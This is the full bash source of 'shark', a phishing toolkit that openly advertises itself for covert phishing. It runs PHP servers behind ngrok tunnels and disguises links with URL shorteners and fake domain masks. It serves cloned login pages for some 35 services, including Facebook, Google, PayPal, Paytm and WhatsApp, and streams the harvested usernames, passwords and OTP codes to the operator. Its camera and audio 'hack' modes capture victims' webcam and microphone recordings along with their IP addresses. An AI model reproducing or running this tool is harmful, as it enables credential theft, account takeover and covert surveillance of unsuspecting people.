#!/bin/bash

##############################################
#                                            #
#             PROJECT: SHARK                 #
#             AUTHOR: ASHISH                 #
#              SHARK ©2021                   #
#     EMAIL: ashishsingh103020@gmail.com     #
#           BEST PHISHING TOOLS              #              
#       created by :- a s h i s h            #
#         REBORN by :- @tech2.gamer          #
##############################################
#########
# COLORS
#########

#colors
white="\033[1;37m"                                          ##
grey="\033[0;37m"                                           ##
purple="\033[1;35m"                                         ##
red="\033[1;31m"                                            ##
green="\033[1;32m"                                          ##
yellow="\033[1;33m"                                         ##
purple="\033[0;35m"                                         ##
cyan="\033[0;36m"                                           ##
cyan1="\033[1;36m"                                          ##
cafe="\033[0;33m"                                           ##
fiuscha="\033[0;35m"                                        ##
blue="\033[1;34m"                                           ##
l_red="\033[1;37;41m"                                       ##
nc="\033[0m"                                                ## 

##########
# VERSION
##########

VERSION="2.0.4"

################
# PRINT MESSAGE
################

msg() {
	printf "${green}[${white}+${green}] ${white}${1}\n${nc}"
}

norm_msg() {
	printf "${green}${1}\n${nc}"
}

error_msg() {
        printf "${red}[!] ${white}${1}\n${nc}"
}

#######
# ARCH
#######

arch=`uname -m`
ArNam=$(dpkg --print-architecture)

#spinner
spinner() {
        pid=$!
        spin='\|/-'
        i=0
        tput civis
        while kill -0 $pid 2>/dev/null
	do	
                i=$(( (i+1) %4 ))
                printf "\r${cyan1}[${spin:$i:1}]${nc} ${cyan1} $launch"
                sleep .1
	done
        printf "\r   ${green}[✔]${nc} ${green} $splashdown";echo
        tput cnorm
}

#check root
function check_root() {
        if [ "$(whoami &2>/dev/null)" != "root" ] && [ "$(id -un &2>/dev/null)" != "root" ];then                
                error_msg "Admin user detected\n"               
                error_msg "You must be root to run this script!\n"
                error_msg "Use 'sudo !!'\n"               
                exit 1
	fi
}


######
# USER
######


#####
# OS
#####

function os () {
	cat /etc/os-release > /dev/null 2>&1
        if [ "$?" -eq "0" ]; then		
                BIN="/usr/bin"
	        phish="/usr/share/shark/phs"
		user_id="$(logname)"
		if [ "${user_id}" = "root" ]; then 
		         files="/root/Desktop"
	        else
		         files="/home/${user_id}/Desktop"
	        fi
		shark="/usr/share/shark"
		old_shark="/usr/bin/shark"
		OS=DEBIAN
		check_root
	else
		BIN="${PREFIX}/bin"
		phish="${PREFIX}/share/shark/phs"
		files="/sdcard"
		shark="${PREFIX}/share/shark"
                old_shark="${PREFIX}/bin/shark"
		OS=TERMUX
	fi
}


function main_update() {
	launch="updating shark"
	splashdown="updated shark";echo:
	os;(wget -q https://github.com/Bhaviktutorials/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
}


function update() {
	version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/shark/master/shark | grep -w "VERSION=" | head -n1)
	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
	if [ "${1}" != "-u" ] || [ "${1}" != "--update" ]; then
		[ ${latest_version} != ${VERSION} ] && echo && msg "shark update is available !!" && sleep 2.5 && echo && msg "Run shark -u , shark --update" && echo && exit 1;	       
        fi
}

###########
# INTERNET
###########

#check ineternet connectivity for update
function internet() {	
	ping -c 1 google.com > /dev/null 2>&1
        if [ $? -eq 0 -a ! "${1}" = "--update" ] && [ $? -eq 0 -a ! "$1" = "-u" ];then		
                update
	fi
}


function connection() {
        ping -c 1 google.com > /dev/null 2>&1
        if [[ "$?" != 0 ]];then
                error_msg "No internet"
        exit 0
        fi
}

function check_update() {	
        connection
        version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/shark/master/shark | grep -w "VERSION=" | head -n1)
	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
        if [ ${latest_version} = ${VERSION} ];then		
                echo -e "\tReading \tpackage \tlists... \tDone
                         \tBuilding \tdependency \ttree       
                         \tReading \tstate \tinformation... \tDone
                         \tshark \tis \talready \tthe \tnewest \tversion \t($VERSION)." | awk '{$1=$1};1'
	        exit 1
	else
		main_update
		exit 1
	fi
}

########
# USAGE
########

usage() {
        cat <<EOF
Usage: $(basename $0) [OPTIONS] available
shark - future of phishing is here,
A shark is a tool that will help you \do Phishing \in an advanced way so no one checks and identify that you are doing phishing.
Copyright 2020 <ashishsingh103020@gmail.com>
Options:
  -u, --update      Update shark
  -v, --version     Display the current shark version installed on your device
  -h, --help        Print this help message
  -a, --assist      List detail discription of shark
  -p, --purge       Uninstall shark
  --fix-ngrok       Fix port forwarding issue 
  --fix-patches     Check missing packages & fix patches
  --fix-cloudshell  Restart Vm and cloudshell & fix patches
For additional info, see: https://github.com/Bhaviktutorials/shark
EOF
}

function purge_shark() {	
        os;printf "${red} Do you wish to delete camera and audio files too ? y/n : ";read ans && [ "$ans" != "${ans#[Yy]}" ];rm -rf ${files}/Camera_hack ${files}/Audio_hack
        rm -rf ${shark} ${old_shark}
}

function fix_patches() {
        launch="fixing shark patches"
	splashdown="shark patches fixed";echo
	os;sed -i -e 's/\r$//' ${shark}/setup
	chmod 777 ${shark}/setup
        (${shark}/setup > /dev/null 2&>1) & spinner
}

function assist() {	
        #put manpage in man dir later
	os
        man ${shark}/manpage
}

function fix_ngrok() {
	#check for all arch
	os;rm -f ${BIN}/ngrok 
	launch="fixing ngrok"
	splashdown="fixed ngrok";echo
	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			ngrok_url="https://github.com/tech2gamer/stuff/raw/main/ngrok-2in1.zip"
		elif [[ "$arch" == *'aarch64'* ]]; then
			ngrok_url="https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip"
		elif [[ "$arch" == *'x86_64'* ]]; then
                        if [[ "$ArNam" == *'amd64'* ]]; then
                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
                        else
                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
		        fi
                else
			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
	fi
	(wget --quiet ${ngrok_url} -O ngrok.zip) & spinner
	unzip -q ngrok.zip && rm -rf ngrok.zip && chmod +x ngrok && mv ngrok $BIN	
}

function fix_cloudshell() {
	os;man ${shark}/cloudshell
}

###########
# OPTS ARG
###########

#getopts argument
while true; do
        case "$1" in		
                -u|--update)			
	                check_update
			;;
			
                -h|--help)			
                        usage       
                        exit 1
			;;

                -v|--version)			
                        printf "version $VERSION\n"
                        exit 1
                        ;;
			
		-p|--purge)
		        purge_shark
			exit 1
			;;

		-a|--assist)
			assist
			exit 1
			;;
						
		--fix-patches)			
			fix_patches
			exit 1
			;;
			
		--fix-ngrok)
		        fix_ngrok
		        exit 1
			;;
			
		--fix-cloudshell)
		        fix_cloudshell
		        exit 1
			;;	
					
                -*)			
                        echo "ERROR: unknown option '$1'" 1>&2
                        echo "see '--help' for usage" 1>&2
                        exit 1
                        ;;

                *)	
                        f=$1
                        break			
                        ;;
	esac
        shift
done

##############
# MAIN DRIVER
##############

# CHECK FILE 
file_check() {	
        [ ! -d "${files}/Camera_hack" ] && mkdir -p ${files}/Camera_hack
        [ ! -d "${files}/Audio_hack" ] && mkdir -p ${files}/Audio_hack
}

#catch_ip camera
catch_ip() {	
        ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
        IFS=$'\n'
        printf "${green}[${white}+${green}] ${yellow}IP:${white} %s ${nc} \n" $ip
        cat ip.txt >> saved.ip.txt
}

# KILL NGROK
function kill_session() {
        Kill_php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
        kill_ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
        kill -9 ${kill_php} > /dev/null 2>&1
        kill -9 ${kill_ngrok} > /dev/null 2>&1
}

function url_checker() {	
        if [ ! "${1//:*}" = http ]; then		
	        if [ ! "${1//:*}" = https ]; then			
                        printf "${red} Invalid URL. Please use http or https. \n "
                        exit 1
		fi
	fi
}

# URL_SHORTNER
function url_shortner() {	
	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
	short=$(curl -s https://soo.gd/api.php?url=${ngrok_url})
        shorter=${short#https://}       
        read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
        url_checker $mask	
	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
	printf "${green}shark ${white}>> ${white}Don't use space in your words\n"	
        read -p $'\e[1;92mshark \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
        final_url=$mask-$words@$shorter
	#printf "$final_url\n"
}

# MAIN 
function main() {
HOST="127.0.0.1"
echo
read -p $'\e[1;32m\e[96m Do You want to enter port?\e[1;91m (Y/N):' drk
if [[ $drk == y || $drk == Y ]]; then
echo ""
read -p $'\e[1;32m\e[96m Please Enter Your Port \e[1;92mEx.3246: \e[0m' PORT

if [[ -z "$PORT" ]]; then
echo
echo -e ${red}"Bro you didn't mentioned anything."
echo
echo -e ${green}"restarting your option No.$option...."
sleep 1
clear
main
fi
#launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
elif [[ $drk == n || $drk == N ]]; then
PORT="8080"
#launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
else
	echo
	echo -e ${red}"Wrong Input..."
	sleep 1
        clear
	main
fi
launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
}

#banner2
banner2() {
	printf "\n${green}
        ╔════════════════════════════════════╗
        ║${white}   ╔═╗┬─┐┌─┐┌┬┐┌─┐┌┐┌┌┬┐┬┌─┐┬  ┌─┐${green}  ║
        ║${white}   ║  ├┬┘├┤  ││├┤ │││ │ │├─┤│  └─┐${green}  ║
        ║${white}   ╚═╝┴└─└─┘─┴┘└─┘┘└┘ ┴ ┴┴ ┴┴─┘└─┘${green}  ║
        ╚════════════════════════════════════╝
     
        Author    : ${white}Ashish Singh${green}
        Github    : ${white}github.com/Bhaviktutorials${green}   
        Publisher : ${white}Bhavik Oza${green}  
	Reborn by : ${white}@tech2.gamer${green}
     
        >> ${white}${final_url}${green} 
                	or
	>> ${white}${ngrok_url}${green} \n
\e[38;5;214m ░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;34m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;92m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓${green}\n\n"	
}

#credentials
function credentials() {
	clear
	banner2

}

#Paytm
function paytm() {
          printf "\n${green}[${white}1${green}]${white} Sign In \n\n" 
          printf "${green}[${white}2${green}]${white} Sign Up \n\n"                           
          read -p $'\e[1;92mshark \e[1;37m>> Enter Your Choice : \e[0m' option1			  
          if [ $option1 = 1 ] || [ $option1 = 01 ]; then	           
		   cd paytm/ && main
		   credentials
                   tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"			              	
	  else	           
                   cd signup/ && main
		   credentials
		   tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
	  fi
}

#CAMERA HACK
function camera_hack() {	
        clear
        printf "\n\e[1;4;92mChoose Your Tempelates\e[0m\n\n"
        printf "${green}[${white}1${green}]${white} Diwali \n\n";printf "${green}[${white}2${green}]${white} Freindship Dare \n\n";printf "${green}[${white}3${green}]${white} Freindship Day \n\n";printf "${green}[${white}4${green}]${white} New Year \n\n";printf "${green}[${white}5${green}]${white} Jio Offfer \n\n"
        read -p $'\e[1;92mshark\e[1;37m >>\e[0m ' page
        link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
        case $page in

                1)			
                        source="diwali.html"
                        ;;

                2)			
                        source="freindship_dare.html"
                        ;;

                3)
                        source="freinship_day.html"
                        ;;

                4) 
                        source="happy_new_year.html"
                        ;;

                5)
                        source="jio_offer.html"
                        ;;
		esac
		link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                sed 's+forwarding_link+'$link'+g' ${source} > index2.html;sed 's+forwarding_link+'$link'+g' template.php > index.php
		main
		credentials
		while [ true ]; do			
                        if [[ -e "ip.txt" ]]; then				
			        printf "\n${green}[${white}+${green}] Victim opened the link!\n\n"
			        catch_ip && rm -rf ip.txt
			fi			 
			sleep 0.5
		        if [[ -e "Log.log" ]]; then				
			        printf "\n${green}[${white}+${green}] Cam file received!\n" && rm -rf Log.log
			fi
			sleep 0.5
			mv cam* ${files}/Camera_hack >> /dev/null 2>&1 
		done
}

# Voice Hack

function audio_hack() {	
        default_redirect="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ/about"
        printf "\n${green}[${white}+${green}] Choose a distracting website ${white}(Default: https://youtube.com) : " $default_redirect && read redirect_link
        redirect_link="${redirect_link:-${default_redirect}}";link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
        sed 's+forwarding_link+'$link'+g' template.php > index.php;sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
	main
	credentials
        while [ true ]; do		
                if [[ -e "ip.txt" ]]; then			
		 	printf "\n${green}[${white}+${green}] Victim opened the link!\n\n"
			catch_ip && rm -rf ip.txt			    
		fi
	        sleep 0.5
	        if [[ -e "Log.log" ]]; then			
			printf "\n${green}[${white}+${green}] Voice file received!\n" && rm -rf Log.log			   
		fi
	        sleep 0.5
		mv 20* ${files}/Audio_hack >> /dev/null 2>&1
	done

}

########
# DRIVER
########

internet
os
kill_session

while :
do
	clear
        printf "${green}

        ██████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗
       ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝
       ╚█████╗ ███████║███████║██████╔╝█████═╝${white}
        ╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗
       ██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗
       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ v ${VERSION}\n\n "

      printf "${green}      ╔──────────────────────────────────────╗\n"
      printf "${green}       |${white}    c r e a t e d  b y  a s h i s h ${green}  |\n"
      printf "${green}       ╚──────────────────────────────────────╝\n\n"

     printf "           ${green}💻 \e[1;4;5;37mSelect An Attack To Deploy\e[0m${green} 💻\n\n"
function banner(){
        printf "\e[1;92m[\e[0m\e[1;37m01\e[0m\e[1;92m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;92m[\e[0m\e[1;37m12\e[0m\e[1;92m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;92m[\e[0m\e[1;37m23\e[0m\e[1;92m] \e[0m\e[1;37;44mWordpress\e[0m          \e[1;92m[\e[0m\e[1;37m33\e[0m\e[1;92m] \e[0m\e[1;37;46mWIFI-(adminpanel)\e[0m\n\n"
        printf "\e[1;92m[\e[0m\e[1;37m02\e[0m\e[1;92m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;92m[\e[0m\e[1;37m13\e[0m\e[1;92m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;92m[\e[0m\e[1;37m24\e[0m\e[1;92m] \e[0m\e[1;37;43mSnapchat\e[0m           \e[1;92m[\e[0m\e[1;37m34\e[0m\e[1;92m] \e[0m\e[1;48;5;4mWIFI-(passwd)\e[0m\n\n"
        printf "\e[1;92m[\e[0m\e[1;37m03\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;92m[\e[0m\e[1;37m14\e[0m\e[1;92m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;92m[\e[0m\e[1;37m25\e[0m\e[1;92m] \e[0m\e[1;37;40mProtonmail\e[0m         \e[1;92m[\e[0m\e[1;37m35\e[0m\e[1;92m] \e[0m\e[1;37;42mGameid-hack\e[0m\n\n"
        printf "\e[1;92m[\e[0m\e[1;37m04\e[0m\e[1;92m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;92m[\e[0m\e[1;37m15\e[0m\e[1;92m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;92m[\e[0m\e[1;37m26\e[0m\e[1;92m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n\n" 
        printf "\e[1;92m[\e[0m\e[1;37m05\e[0m\e[1;92m] \e[0m\e[1;93;40mOLA\e[0m                \e[1;92m[\e[0m\e[1;37m16\e[0m\e[1;92m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;92m[\e[0m\e[1;37m27\e[0m\e[1;92m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n\n"  
        printf "\e[1;92m[\e[0m\e[1;37m06\e[0m\e[1;92m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;92m[\e[0m\e[1;37m17\e[0m\e[1;92m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;92m[\e[0m\e[1;37m28\e[0m\e[1;92m] \e[0m\e[1;48;5;129mTwitch\e[0m\n\n"           
        printf "\e[1;92m[\e[0m\e[1;37m07\e[0m\e[1;92m] \e[0m\e[1;107m\e[30mPay\e[106mtm\e[0m              \e[1;92m[\e[0m\e[1;37m18\e[0m\e[1;92m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;92m[\e[0m\e[1;37m29\e[0m\e[1;92m] \e[0m\e[1;48;5;236mAJIO\e[0m\n\n"
        printf "\e[1;92m[\e[0m\e[1;37m08\e[0m\e[1;92m] \e[0m\e[1;91;107mNetflix\e[0m            \e[1;92m[\e[0m\e[1;37m19\e[0m\e[1;92m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;92m[\e[0m\e[1;37m30\e[0m\e[1;92m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n\n"   
        printf "\e[1;92m[\e[0m\e[1;37m09\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;92m[\e[0m\e[1;37m20\e[0m\e[1;92m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;92m[\e[0m\e[1;37m31\e[0m\e[1;92m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n\n"
        printf "\e[1;92m[\e[0m\e[1;37m10\e[0m\e[1;92m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;92m[\e[0m\e[1;37m21\e[0m\e[1;92m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;92m[\e[0m\e[1;37m32\e[0m\e[1;92m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
        printf "\e[1;92m[\e[0m\e[1;37m11\e[0m\e[1;92m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;92m[\e[0m\e[1;37m22\e[0m\e[1;92m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;92m[\e[0m\e[1;37m99\e[0m\e[1;92m] \e[0m\e[1;91;102mExit\e[0m\n\n"
        read -p $'\e[1;92mshark \e[1;97m>>\e[0m ' option
}


#######
# MAIN
#######
        
	#banner
        banner

        if [ $option = 01 ] || [ $option = 1 ];then		
	        cd ${phish}/facebook/ && main
		credentials
	        tail -f usernames.txt 
                break;

	elif [ $option = 02 ] || [ $option = 2 ];then		
                cd $phish/pinterest/ && main    
		credentials
                tail -f log.txt | grep -e "id" -e "password"
                break;

	elif [ $option = 03 ] || [ $option = 3 ];then		
		cd $phish/instagram/ && main
		credentials
	        tail -f log.txt
                break;
			   
	elif [ $option = 04 ] || [ $option = 4 ];then		
                cd $phish/UberEats-Phishing/ && main	
		credentials
	        tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"
                break;
			  
        elif [ $option = 05 ] || [ $option = 5 ];then		
                cd $phish/ola-otpbypass/ && main
		credentials
		tail -f log.txt | grep -e "number" -e "otp" -e "OTP"
                break;
			  
        elif [ $option = 06 ] || [ $option = 6 ];then		
                cd $phish/google-otp/ && main 
		credentials
		tail -f log.txt | grep -e "email" -e "password" -e "OTP"
                break;		
			  
        elif [ $option = 07 ] || [ $option = 7 ];then		
                cd $phish/Paytm-Phishing/ && paytm            
		break;
			
        elif [ $option = 08 ] || [ $option = 8 ];then		
                cd $phish/Netflix/ && main        
		credentials
                tail -f log.txt | grep -e "userLoginId" -e "password" -e "OTP"                 
                break;

        elif [ $option = 09 ] || [ $option = 9 ];then		
                cd $phish/instafollow/ && main    
		credentials
                tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        
                break;
			   
        elif [ $option = 10 ];then		
                cd $phish/amazonsign/ && main   
		credentials
                tail -f log.txt | grep -e "email" -e "password" -e "OTP"  
                break;

        elif [ $option = 11 ];then		
                cd $phish/whatsapp-phishing/ && main
		credentials
                tail -f log.txt | grep -e "number" -e "OTP" -e "otp"      
                break;		
			   
	elif [ $option = 12 ];then		
                cd $phish/Linkedin/ && main    
		credentials
                tail -f log.txt | grep -e "email" -e "Email" -e "password" -e "pin" -e "Pin"
                break;

        elif [ $option = 13 ];then		
                cd $phish/Hotstar-otp-bypass/ && main    
		credentials
                tail -f log.txt | grep -e "phoneNo" -e "OTP"
                break;		
      
        elif [ $option = 14 ];then		
                cd $phish/spotify/ && main    
		credentials
                tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"
                break;
			  	
        elif [ $option = 15 ];then		
                cd $phish/github/ && main 
		credentials
                tail -f log.txt | grep -e "login" -e "password" -e "otp"
                break;
			   
	elif [ $option = 16 ];then		
                cd $phish/ipfinder/ && main
		credentials
                tail -f ip.txt        
                break;

        elif [ $option = 17 ];then		
                cd $phish/Zomato-Phishing/ && main    
		credentials
                tail -f log.txt | grep -e "email" -e "otp" -e "OTP"                
                break;

        elif [ $option = 18 ];then		
                cd $phish/phonepay/ && main   
		credentials
                tail -f log.txt | grep -e "number" -e "otp"
                break;
			   
	elif [ $option = 19 ];then		
                cd $phish/paypal/ && main    
		credentials
                tail -f log.txt | grep -e "login_email" -e "login_password" -e "otpCode"
                break;

	elif [ $option = 20 ];then		
                cd $phish/telegram/ && main
		credentials
                tail -f log.txt | grep -e "phone_number" -e "phone_code"
                break;
			   
	elif [ $option = 21 ];then		
                cd $phish/twitter/ && main
		credentials
                tail -f log.txt | grep -e "phone_or_email" -e "password" -e "challenge_response"
                break;
		               
	elif [ $option = 22 ];then		
                cd $phish/flipcart/ && main  
		credentials
                tail -f log.txt | grep -e "email" -e "password" -e "otp"
                break;
       
        elif [ $option = 23 ];then		
                cd $phish/wordpress/ && main  
		credentials
                tail -f log.txt | grep -e "log" -e "pwd"
                break;		
			  
	elif [ $option = 24 ];then		
                cd $phish/snapchat/ && main
		credentials
                tail -f log.txt | grep -e "username" -e "password" -e "Code"
                break;
		
	elif [ $option = 25 ];then		
                cd $phish/protonmail/ && main    
		credentials
                tail -f log.txt | grep -e "username" -e "password"   
                break;

        elif [ $option = 26 ];then		
                cd $phish/stackoverflow/ && main  
		credentials
                tail -f log.txt | grep -e "email" -e "password"
                break;

        elif [ $option = 27 ];then		
                cd $phish/ebay/ && main    
		credentials
                tail -f log.txt | grep -e "userid" -e "pass" -e "pin"
                break;

        elif [ $option = 28 ];then		
                cd $phish/twitch/ && main
		credentials
                tail -f log.txt | grep -e "Username" -e "password" -e "otp"
                break;
                
	elif [ $option = 29 ];then		
                cd $phish/ajio/ && main  
		credentials
                tail -f log.txt | grep -e "username" -e "password"
                break;
			   
	elif [ $option = 30 ];then		
                cd $phish/mobikwik/ && main 
		credentials
                tail -f log.txt | grep -e "userId" -e "otp"
                break;
			  
	elif [ $option = 31 ];then				  
		cd $phish/Camera_hack && file_check		
		camera_hack
	        break;
			   
        elif [ $option = 32 ];then 		
		cd $phish/Audio_hack && file_check
                audio_hack
		break;
	
        elif [ $option = 33 ];then		
                cd $phish/wiapp/ && main 
		credentials
                tail -f log.txt | grep -e "Username:" -e "Password:"
                break;
	
	elif [ $option = 34 ];then		
                cd $phish/wip/ && main 
		credentials
                tail -f log.txt | grep -e "Password:"
                break;
	
	elif [ $option = 35 ];then		
                cd $phish/gidp/ && main
		credentials
                tail -f log.txt | grep -e "Game:" -e "Email:" -e "Password:"
                break;			   



	elif [ $option = 99 ];then		
		printf "\n" && exit 
		break;

	else		
		printf "\n${green}[${yellow}!${green}${red} Invalid option Try Again !!${white}\n"
		sleep 0.8
	fi
done
		  
		  
#####################################################################
#                                                                   #
#      simply changing this banner will not make you developer      #
#                   CREATED BY ASHISH                               #
#                   KEEP SUPPORTING                                 #
#                      THANKYOU                                     #
#                                                                   #
#####################################################################

